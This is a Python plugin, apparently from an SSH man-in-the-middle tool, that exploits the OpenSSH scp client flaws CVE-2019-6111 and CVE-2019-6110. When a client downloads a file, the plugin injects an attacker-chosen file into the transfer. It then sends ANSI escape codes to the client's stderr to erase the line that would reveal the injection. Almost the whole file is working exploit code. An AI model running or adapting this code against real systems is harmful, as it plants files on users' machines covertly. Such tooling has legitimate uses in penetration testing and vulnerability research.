"""
A plugin for exploiting CVE-2019-6111, CVE-2019-6110, based on the vulnerability
'SSHtranger Things' of OpenSSH Client.

This class is a subclass of SCPForwarder and injects an additional file during
SCP transmission by exploiting the OpenSSH Client vulnerability 'SSHtranger Things'.
This vulnerability has been patched in OpenSSH versions greater than 8.0p1.
The exploitation process starts by parsing the SCP command and identifying whether
the SCP client is downloading a file. If yes, the class instance is returned and the
exploit method is called. The method exploits both CVE-2019-6111 and CVE-2019-6110.
"""

import logging
import os
import sshmitm
from sshmitm.forwarders.scp import SCPForwarder


class SCPInjectFile(SCPForwarder):
    '''Injecting an additional file during SCP transmission (CVE-2019-6111, CVE-2019-6110)

    This feature is based on a OpenSSH Client Vulnerability 'SSHtranger Things'
    that has been patched with version > OpenSSH 8.0p1

    Title:     SSHtranger Things
    Author:    Mark E. Haase <mhaase@hyperiongray.com>
    Homepage:  https://www.hyperiongray.com
    Date:      2019-01-17
    CVE:       CVE-2019-6111, CVE-2019-6110
    Advisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt
    '''

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.parser().add_argument_group(
            cls.__name__,
            "Example exploit for CVE-2019-6111, CVE-2019-6110"
        )
        plugin_group.add_argument(
            '--scp-inject',
            dest='scp_inject_file',
            required=True,
            help='file that is used for injection'
        )

    def __new__(cls, *args, **kwargs):  # type: ignore
        del kwargs  # unused arguments
        if args[0].scp_command.find(b'-f') != -1:
            return super(SCPInjectFile, cls).__new__(cls)
        logging.debug("SCPClient is not downloading a file, reverting to normal SCPForwarder")
        return SCPForwarder(args[0])

    def __init__(self, session: 'sshmitm.session.Session') -> None:
        super().__init__(session)
        self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)

        self.inject_file_stat = os.stat(self.args.scp_inject_file)
        self.file_to_inject = None

    def process_data(self, traffic: bytes) -> bytes:
        if traffic == b'\x00':
            self.exploit()
        return traffic

    def exploit(self) -> None:
        """This method starts to exploit CVE-2019-6111 and CVE-2019-6110.
        """
        def wait_ok() -> bool:
            if self.session.scp_channel is None:
                return False
            return self.session.scp_channel.recv(1024) == b'\x00'

        def send_ok() -> None:
            if self.session.scp_channel is None:
                return
            self.session.scp_channel.sendall(b'\x00')

        # This is CVE-2019-6111: whatever file the client requested, we send
        # them 'exploit.txt' instead.
        if self.session.scp_channel is None:
            return
        logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
        command = "{}{} {} {}\n".format(  # pylint: disable=consider-using-f-string
            self.file_command,
            "{0:o}".format(self.inject_file_stat.st_mode)[2:],  # pylint: disable=consider-using-f-string
            self.inject_file_stat.st_size,
            self.args.scp_inject_file.split('/')[-1]
        )
        logging.debug("Sending command %s", command.strip())
        self.session.scp_channel.sendall(command.encode())
        if not wait_ok():
            logging.info("Client is not vulnerable to CVE-2019-6111")
            self.hide_tracks()
            return
        with open(self.args.scp_inject_file, 'rb') as file_to_inject:
            self.sendall(self.session.scp_channel, file_to_inject.read(), self.session.scp_channel.send)
        send_ok()
        wait_ok()
        self.hide_tracks()
        logging.warning("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())

    def hide_tracks(self) -> None:
        """
        This method exploits CVE-2019-6110: the client will display the text that we send
        to stderr, even if it contains ANSI escape sequences. We can send
        ANSI codes that clear the current line to hide the fact that a second
        file was transmitted..
        Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K
        """
        if self.session.scp_channel is None:
            return
        self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
